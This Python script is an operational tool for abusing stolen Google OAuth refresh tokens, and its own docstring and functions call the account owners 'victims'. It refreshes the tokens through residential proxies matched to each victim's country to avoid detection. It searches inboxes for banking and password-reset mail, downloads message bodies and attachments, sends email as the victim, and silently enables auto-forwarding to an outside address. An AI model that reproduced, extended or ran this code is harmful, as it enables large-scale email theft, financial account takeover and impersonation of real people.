#!/usr/bin/env python3
"""
Google OAuth Refresh Token Tester

Usage:
  python test_token.py <token_file_or_dir>           # Test tokens
  python test_token.py --check-gmail <dir>            # Try Gmail API on valid tokens
  python test_token.py --discover <dir>               # Search Gmail for accounts
  python test_token.py --list-tokens [victims_dir]       # List all victim tokens
  python test_token.py --fetch-emails <dir> [count]      # Download full email bodies
  python test_token.py --send <dir> <to> <subj> <body>   # Send email as victim
  python test_token.py --dump-attachments <dir> [outdir]  # Download all attachments
  python test_token.py --forward <dir> <forward_to>       # Set up auto-forwarding
  python token_to_session.py <token>                      # Get browser session cookies

Environment:
  HTTP_PROXY / HTTPS_PROXY  Set to your residential proxy URL
  GOOGLE_CLIENT_ID          Override default client ID

Examples:
  export HTTPS_PROXY="http://user:pass@us-proxy:8080"
  python test_token.py victims/US_24.45.115.247/
  python test_token.py victims/PH_112.201.133.55/token_01.txt
  python test_token.py --list-tokens ../token_testing/victims/
  python test_token.py --summary /path/to/victims/
"""

import os, sys, json, glob, requests
from pathlib import Path
from datetime import datetime

CLIENT_IDS = [
    "77185425430.apps.googleusercontent.com",
    "407408718192.apps.googleusercontent.com",
]
TIMEOUT = 30

# --- Token loader ---

def load_tokens(path):
    """Load tokens from a file or directory. Returns list of (token, source_file)."""
    tokens = []
    p = Path(path)
    if p.is_dir():
        tok_file = p / "tokens.txt"
        if tok_file.exists():
            for line in tok_file.read_text().strip().splitlines():
                line = line.strip()
                if line and line.startswith("1//"):
                    tokens.append((line, str(tok_file)))
        else:
            for f in sorted(p.glob("token_*.txt")):
                line = f.read_text().strip()
                if line and line.startswith("1//"):
                    tokens.append((line, str(f)))
    elif p.is_file():
        for line in p.read_text().strip().splitlines():
            line = line.strip()
            if line and line.startswith("1//"):
                tokens.append((line, str(p)))
    else:
        print(f"Error: {path} not found")
        sys.exit(1)
    return tokens

# --- Proxy loader ---

def get_proxy():
    """Get proxy settings from environment."""
    https_proxy = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
    http_proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
    if not https_proxy and not http_proxy:
        print("WARNING: No proxy set in HTTP_PROXY or HTTPS_PROXY")
        print("Google may reject token refreshes from your IP.")
        print("Set proxy matching victim's country:")
        print("export HTTPS_PROXY='http://user:pass@residential-proxy:port'\n")
        return None
    proxies = {}
    if https_proxy:
        proxies["https"] = https_proxy
    if http_proxy:
        proxies["http"] = http_proxy
    return proxies

# --- Token tester ---

def test_token(token, client_id, proxies):
    """Test a single refresh token. Returns (success, data, status_str)."""
    try:
        resp = requests.post(
            "https://oauth2.googleapis.com/token",
            data={
                "client_id": client_id,
                "refresh_token": token,
                "grant_type": "refresh_token",
            },
            proxies=proxies,
            timeout=TIMEOUT,
        )
        if resp.status_code == 200:
            data = resp.json()
            access_token = data.get("access_token")
            if access_token:
                headers = {"Authorization": f"Bearer {access_token}"}
                info = requests.get(
                    "https://www.googleapis.com/oauth2/v1/userinfo",
                    headers=headers, proxies=proxies, timeout=TIMEOUT,
                )
                if info.status_code == 200:
                    user = info.json()
                    return (True, {
                        "access_token": access_token[:30] + "...",
                        "expires_in": data.get("expires_in"),
                        "scope": data.get("scope", ""),
                        "email": user.get("email", "unknown"),
                        "name": user.get("name", "unknown"),
                        "gaia_id": user.get("id", "unknown"),
                    }, "VALID")
                else:
                    return (True, {"access_token": access_token[:30] + "..."},
                            "VALID (no userinfo)")
            return (True, data, "VALID (no access_token)")
        elif resp.status_code == 400:
            err = resp.json().get("error", "")
            desc = resp.json().get("error_description", "")
            if err == "invalid_grant":
                return (False, resp.json(), "REVOKED")
            elif err == "unauthorized_client":
                return (False, resp.json(), "WRONG_CLIENT_ID")
            elif err == "invalid_request":
                return (False, resp.json(), "INVALID_REQUEST")
            else:
                return (False, resp.json(), f"ERROR: {err}")
        elif resp.status_code == 403:
            return (False, {}, "BLOCKED (geo/IP issue)")
        else:
            return (False, {}, f"HTTP_{resp.status_code}")
    except requests.exceptions.ProxyError:
        return (False, {}, "PROXY_ERROR")
    except requests.exceptions.ConnectTimeout:
        return (False, {}, "TIMEOUT")
    except requests.exceptions.ConnectionError:
        return (False, {}, "CONNECTION_ERROR")
    except Exception as e:
        return (False, {}, f"EXCEPTION: {e}")

# --- Gmail helpers ---

def check_gmail_access(access_token, proxies):
    """Try to read Gmail messages."""
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        resp = requests.get(
            "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5",
            headers=headers, proxies=proxies, timeout=TIMEOUT,
        )
        if resp.status_code == 200:
            data = resp.json()
            return (True, len(data.get("messages", [])), data)
        elif resp.status_code == 403:
            return (False, 0, {"error": "insufficient_scope (no Gmail access)"})
        elif resp.status_code == 401:
            return (False, 0, {"error": "access_token_expired"})
        else:
            return (False, 0, resp.json())
    except Exception as e:
        return (False, 0, {"error": str(e)})


def discover_accounts(access_token, proxies):
    """Search Gmail for financial account emails."""
    headers = {"Authorization": f"Bearer {access_token}"}
    queries = [
        "password reset", "welcome to", "verification code",
        "bank statement", "transaction alert", "your account",
        "security alert", "recovery code", "confirmation",
    ]
    found = []
    for q in queries:
        try:
            resp = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages?q={q}&maxResults=3",
                headers=headers, proxies=proxies, timeout=TIMEOUT,
            )
            if resp.status_code == 200:
                data = resp.json()
                count = len(data.get("messages", []))
                if count > 0:
                    found.append({"query": q, "count": count})
        except:
            pass
    return found

# --- Command: list-tokens ---

def cmd_list_tokens(victims_dir="victims/"):
    for v_dir in sorted(glob.glob(os.path.join(victims_dir, "*/"))):
        ctx = os.path.join(v_dir, "context.md")
        tok = os.path.join(v_dir, "tokens.txt")
        if not os.path.exists(ctx):
            continue
        country = "?"
        for line in open(ctx):
            if line.startswith("Country:"):
                country = line.split(":", 1)[1].strip()
                break
        tcount = 0
        if os.path.exists(tok):
            tcount = len([l for l in open(tok).read().strip().splitlines()
                          if l.startswith("1//")])
        name = os.path.basename(v_dir.rstrip("/"))
        res_file = os.path.join(v_dir, "results.md")
        tested = "[x]" if os.path.exists(res_file) else "[ ]"
        print(f"  {tested} {name}  ({country})  - {tcount} tokens")

# --- Command: summary ---

def cmd_summary(victims_dir="victims/"):
    found_any = False
    for v_dir in sorted(glob.glob(os.path.join(victims_dir, "*/"))):
        res_file = os.path.join(v_dir, "results.md")
        if os.path.exists(res_file):
            content = open(res_file).read()
            name = os.path.basename(v_dir.rstrip("/"))
            print(f"\n{'='*60}")
            print(f" {name}")
            print(f"{'='*60}")
            print(content)
            found_any = True
    if not found_any:
        print("No results found. Run tests first.")

# --- Command: check-gmail ---

def cmd_check_gmail(target):
    proxies = get_proxy()
    tokens = load_tokens(target)
    access_tokens = []
    for token, src in tokens:
        for cid in CLIENT_IDS:
            success, data, status = test_token(token, cid, proxies)
            if success and isinstance(data, dict) and "access_token" in data:
                access_tokens.append({
                    "email": data.get("email", "?"),
                    "token": data["access_token"].replace("...", ""),
                })
                break
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    for at in access_tokens:
        ok, count, data = check_gmail_access(at["token"], proxies)
        if ok:
            print(f"{at['email']}: Gmail ACCESSIBLE ({count} messages)")
        else:
            print(f"{at['email']}: NO Gmail access - {data.get('error', '?')}")

# --- Command: discover ---

def cmd_discover(target):
    proxies = get_proxy()
    tokens = load_tokens(target)
    access_tokens = []
    for token, src in tokens:
        for cid in CLIENT_IDS:
            success, data, status = test_token(token, cid, proxies)
            if success and isinstance(data, dict) and "access_token" in data:
                access_tokens.append({
                    "email": data.get("email", "?"),
                    "token": data["access_token"].replace("...", ""),
                })
                break
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    for at in access_tokens:
        print(f"\nSearching Gmail for: {at['email']}")
        results = discover_accounts(at["token"], proxies)
        if results:
            for r in results:
                print(f"  Found {r['count']} emails matching '{r['query']}'")
        else:
            print("  No account discovery emails found")

# --- Main ---

def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)
    if args[0] == "--list-tokens":
        victims_dir = args[1] if len(args) > 1 else "victims/"
        cmd_list_tokens(victims_dir)
        sys.exit(0)
    if args[0] == "--summary":
        victims_dir = args[1] if len(args) > 1 else "victims/"
        cmd_summary(victims_dir)
        sys.exit(0)
    if args[0] == "--check-gmail":
        if len(args) < 2:
            print("Usage: python test_token.py --check-gmail <dir>")
            sys.exit(1)
        cmd_check_gmail(args[1])
        sys.exit(0)
    if args[0] == "--discover":
        if len(args) < 2:
            print("Usage: python test_token.py --discover <dir>")
            sys.exit(1)
        cmd_discover(args[1])
        sys.exit(0)
    if args[0] == "--fetch-emails":
        if len(args) < 2:
            print("Usage: python test_token.py --fetch-emails <dir> [count]")
            sys.exit(1)
        count = int(args[2]) if len(args) > 2 else 10
        cmd_fetch_emails(args[1], count)
        sys.exit(0)
    if args[0] == "--send":
        if len(args) < 5:
            print("Usage: python test_token.py --send <dir> <to> <subject> <body>")
            sys.exit(1)
        cmd_send_email(args[1], args[2], args[3], args[4])
        sys.exit(0)
    if args[0] == "--dump-attachments":
        if len(args) < 2:
            print("Usage: python test_token.py --dump-attachments <dir> [output_dir]")
            sys.exit(1)
        outdir = args[2] if len(args) > 2 else "attachments_dump"
        cmd_dump_attachments(args[1], outdir)
        sys.exit(0)
    if args[0] == "--forward":
        if len(args) < 3:
            print("Usage: python test_token.py --forward <dir> <forward_to>")
            sys.exit(1)
        cmd_forward(args[1], args[2])
        sys.exit(0)

    # Default: test tokens
    target = args[0]
    proxies = get_proxy()
    env_cid = os.environ.get("GOOGLE_CLIENT_ID")
    client_ids = [env_cid] if env_cid else CLIENT_IDS
    tokens = load_tokens(target)
    if not tokens:
        print(f"No valid 1// tokens found in {target}")
        sys.exit(1)

    target_path = Path(target)
    results_file = (target_path / "results.md") if target_path.is_dir() else \
                   (target_path.parent / "results.md")
    context_file = (target_path / "context.md") if target_path.is_dir() else \
                   (target_path.parent / "context.md")

    print(f"\n{'='*60}")
    print(f" Testing {len(tokens)} token(s) from: {target}")
    print(f"{'='*60}")
    if context_file.exists():
        for line in context_file.read_text().strip().splitlines()[:6]:
            print(f"  {line}")

    print(f"\n{'Token':<40} {'Client ID':<20} {'Result'}")
    print("-"*80)

    results = []
    for token, source in tokens:
        tested = False
        for cid in client_ids:
            success, data, status = test_token(token, cid, proxies)
            if success:
                print(f" {token[:37]:<40} {cid[:18]:<20} OK {status}")
                results.append({"token": token, "client_id": cid,
                                "result": status, "data": data, "success": True})
                tested = True
                break
            elif status == "WRONG_CLIENT_ID":
                print(f" {token[:37]:<40} {cid[:18]:<20} X  {status}")
                continue
            else:
                print(f" {token[:37]:<40} {cid[:18]:<20} X  {status}")
                results.append({"token": token, "client_id": cid,
                                "result": status, "data": data, "success": False})
                tested = True
                break
        if not tested:
            results.append({"token": token, "client_id": "ALL",
                            "result": "WRONG_CLIENT_ID", "data": {}, "success": False})

    valid_count = sum(1 for r in results if r["success"])
    print(f"\n{'='*60}")
    print(f" Results: {valid_count}/{len(results)} valid")
    print(f"{'='*60}")

    with open(results_file, "w") as f:
        f.write(f"# Test Results\n")
        f.write(f"**Date:** {datetime.now().isoformat()}\n\n")
        f.write(f"| # | Token (prefix) | Client ID | Result | Email |\n")
        f.write(f"|---|---------------|-----------|--------|-------|\n")
        for i, r in enumerate(results, 1):
            email = r["data"].get("email", "-") if isinstance(r["data"], dict) else "-"
            f.write(f"| {i} | `{r['token'][:30]}...` | `{r['client_id'][:25]}` | "
                    f"{r['result']} | {email} |\n")
        f.write(f"\n**Summary:** {valid_count}/{len(results)} valid\n")
        valid = [r for r in results if r["success"] and isinstance(r["data"], dict)]
        if valid:
            f.write(f"\n## Valid Tokens\n")
            for r in valid:
                email = r["data"].get("email", "?")
                name = r["data"].get("name", "?")
                gaia = r["data"].get("gaia_id", "?")
                scope = r["data"].get("scope", "?")
                f.write(f"- **{email}** ({name}) - Gaia: {gaia} - Scope: {scope}\n")

    print(f" Results saved: {results_file}")
    if valid_count > 0:
        print(f"\nNext: Check Gmail access:")
        print(f"  python test_token.py --check-gmail {target}")
        print(f"  python test_token.py --discover {target}")
        print(f"  python test_token.py --fetch-emails {target}")
        print(f"  python test_token.py --dump-attachments {target}")
        print(f"  python test_token.py --forward {target} forward_to@example.com")
        print(f"  python token_to_session.py <token_file>  (browser access)")

# --- Shared helper: get access tokens from a target dir ---

def get_access_tokens(target, proxies):
    """Refresh all tokens in target and return list of (email, access_token)."""
    token_list = load_tokens(target)
    access_tokens = []
    for token, src in token_list:
        for cid in CLIENT_IDS:
            success, data, status = test_token(token, cid, proxies)
            if success and isinstance(data, dict) and "access_token" in data:
                access_tokens.append({
                    "email": data.get("email", "?"),
                    "token": data["access_token"].replace("...", ""),
                })
                break
    return access_tokens


# --- Command: fetch-emails ---

def cmd_fetch_emails(target, max_results=10):
    """Download full email bodies from the victim's Gmail."""
    import base64
    proxies = get_proxy()
    access_tokens = get_access_tokens(target, proxies)
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    for at in access_tokens:
        print(f"\n{'='*60}")
        print(f" Emails for: {at['email']}")
        print(f"{'='*60}")
        headers = {"Authorization": f"Bearer {at['token']}"}
        resp = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults={max_results}",
            headers=headers, proxies=proxies, timeout=TIMEOUT,
        )
        if resp.status_code != 200:
            print(f"  [!] Failed: HTTP {resp.status_code}")
            continue
        msg_ids = [m["id"] for m in resp.json().get("messages", [])]
        if not msg_ids:
            print("  (empty inbox)")
            continue
        for mid in msg_ids:
            resp = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{mid}?format=full",
                headers=headers, proxies=proxies, timeout=TIMEOUT,
            )
            if resp.status_code != 200:
                continue
            payload = resp.json()
            hdrs = {h["name"]: h["value"] for h in payload.get("payload", {}).get("headers", [])}
            print(f"\n  --- {payload['id']} ---")
            print(f"  From:    {hdrs.get('From', '?')}")
            print(f"  Date:    {hdrs.get('Date', '?')}")
            print(f"  Subject: {hdrs.get('Subject', '(no subject)')}")
            body = ""
            parts = payload.get("payload", {}).get("parts", [])
            if parts:
                for part in parts:
                    if part.get("mimeType") == "text/plain" and "data" in part.get("body", {}):
                        body = base64.urlsafe_b64decode(part["body"]["data"]).decode("utf-8", errors="replace")
                        break
            elif "body" in payload.get("payload", {}):
                bdata = payload["payload"]["body"].get("data", "")
                if bdata:
                    body = base64.urlsafe_b64decode(bdata).decode("utf-8", errors="replace")
            if body:
                for line in body.strip().splitlines()[:15]:
                    print(f"  | {line}")
                if len(body.splitlines()) > 15:
                    print(f"  | ... ({len(body.splitlines())} total lines)")
            print()


# --- Command: send email ---

def cmd_send_email(target, to_addr, subject, body):
    """Send an email from the victim's Gmail account."""
    from email.mime.text import MIMEText
    import base64
    proxies = get_proxy()
    access_tokens = get_access_tokens(target, proxies)
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    at = access_tokens[0]
    print(f"[*] Sending email as {at['email']} -> {to_addr}...")
    headers = {"Authorization": f"Bearer {at['token']}", "Content-Type": "application/json"}
    msg = MIMEText(body)
    msg["To"] = to_addr
    msg["From"] = at["email"]
    msg["Subject"] = subject
    raw = base64.urlsafe_b64encode(msg.as_bytes()).decode("utf-8")
    resp = requests.post(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
        headers=headers, proxies=proxies, timeout=TIMEOUT, json={"raw": raw},
    )
    if resp.status_code == 200:
        print(f"  [+] Sent! Message ID: {resp.json().get('id', '?')}")
    elif resp.status_code == 403:
        print(f"  [-] Insufficient scope - need gmail.compose or gmail.send")
    else:
        print(f"  [-] Failed: HTTP {resp.status_code}: {resp.text[:200]}")

# --- Command: dump attachments ---

def cmd_dump_attachments(target, output_dir="attachments_dump"):
    """Download all attachments from the victim's Gmail."""
    import base64
    proxies = get_proxy()
    access_tokens = get_access_tokens(target, proxies)
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    at = access_tokens[0]
    headers = {"Authorization": f"Bearer {at['token']}"}
    print(f"[*] Searching for messages with attachments for {at['email']}...")
    resp = requests.get(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=has:attachment&maxResults=20",
        headers=headers, proxies=proxies, timeout=TIMEOUT,
    )
    if resp.status_code != 200:
        print(f"  [!] Failed: HTTP {resp.status_code}")
        return
    msg_ids = [m["id"] for m in resp.json().get("messages", [])]
    print(f"  Found {len(msg_ids)} message(s) with attachments")
    total = 0
    for mid in msg_ids:
        resp = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{mid}?format=full",
            headers=headers, proxies=proxies, timeout=TIMEOUT,
        )
        if resp.status_code != 200:
            continue
        parts = resp.json().get("payload", {}).get("parts", [])
        for part in parts:
            fn = part.get("filename", "")
            if not fn or part.get("body", {}).get("attachmentId") is None:
                continue
            att_id = part["body"]["attachmentId"]
            resp2 = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{mid}/attachments/{att_id}",
                headers=headers, proxies=proxies, timeout=TIMEOUT,
            )
            if resp2.status_code == 200:
                data_b64 = resp2.json().get("data", "")
                if data_b64:
                    fpath = out / fn
                    fpath.write_bytes(base64.urlsafe_b64decode(data_b64))
                    print(f"  [+] Saved: {fpath} ({fpath.stat().st_size} bytes)")
                    total += 1
    print(f"\n  Total: {total} attachment(s) saved to {out.resolve()}")


# --- Command: forward ---

def cmd_forward(target, forward_to):
    """Set up automatic email forwarding to an external address."""
    proxies = get_proxy()
    access_tokens = get_access_tokens(target, proxies)
    if not access_tokens:
        print("No valid tokens found. Test tokens first.")
        return
    at = access_tokens[0]
    headers = {"Authorization": f"Bearer {at['token']}", "Content-Type": "application/json"}
    print(f"[*] Setting up forwarding from {at['email']} to {forward_to}...")
    resp = requests.post(
        "https://gmail.googleapis.com/gmail/v1/users/me/settings/forwardingAddresses",
        headers=headers, proxies=proxies, timeout=TIMEOUT,
        json={"forwardingEmail": forward_to},
    )
    if resp.status_code == 200:
        print(f"  [+] Forwarding address added: {forward_to}")
    elif resp.status_code == 409:
        print(f"  [+] Forwarding address already exists")
    elif resp.status_code == 403:
        print(f"  [-] Insufficient scope for forwarding (need gmail.settings scope)")
        return
    else:
        print(f"  [-] Failed: HTTP {resp.status_code}: {resp.text[:200]}")
        return
    resp = requests.put(
        "https://gmail.googleapis.com/gmail/v1/users/me/settings/autoForwarding",
        headers=headers, proxies=proxies, timeout=TIMEOUT,
        json={"enabled": True, "emailAddress": forward_to, "disposition": "archive"},
    )
    if resp.status_code == 200:
        print(f"  [+] Auto-forwarding enabled -> {forward_to}")
    elif resp.status_code == 403:
        print(f"  [-] Insufficient scope for auto-forwarding.")
    else:
        print(f"  [-] Failed: HTTP {resp.status_code}: {resp.text[:200]}")
if __name__ == "__main__":
    main()
